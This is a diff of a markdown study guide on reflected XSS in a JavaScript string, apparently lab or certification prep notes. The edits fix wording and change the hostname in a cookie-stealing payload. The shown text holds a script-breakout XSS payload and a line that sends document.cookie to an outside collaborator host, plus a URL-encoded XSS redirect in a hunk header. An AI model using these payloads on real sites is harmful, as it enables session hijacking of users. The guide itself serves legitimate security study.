@@ -319,7 +319,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 
 ### Reflected String XSS  
 
->Submiting search string and reviewing the source code of the search result page, JavaScript string variable is identified to reflect the search string.  
+>Submitting a search string and reviewing the source code of the search result page, the JavaScript string variable is ***identified*** to reflect the search string in the code variable named ```searchTerms```.  
 
 ![JavaScript string with single quote and backslash escaped](images/javascript-string-reflection.png)  
 
@@ -329,10 +329,10 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 </script><script>alert(1)</script>
 ```  
 
->Changing the payload to a cookie stealer that deliver the session token to Burp Collaborator. This can be place in exploit server with an **iframe**.  
+>Changing the payload to a cookie stealer that deliver the session token to Burp Collaborator. This can be placed on an exploit server within an **iframe**.  
 
 ```html
-</script><script>document.location="https://collaboration.net/?cookie="+document.cookie</script>
+</script><script>document.location="https://Collaborator.net/?cookie="+document.cookie</script>
 ```  
 
 ![collaborator get cookies](images/collaborator-get-cookies.png)  
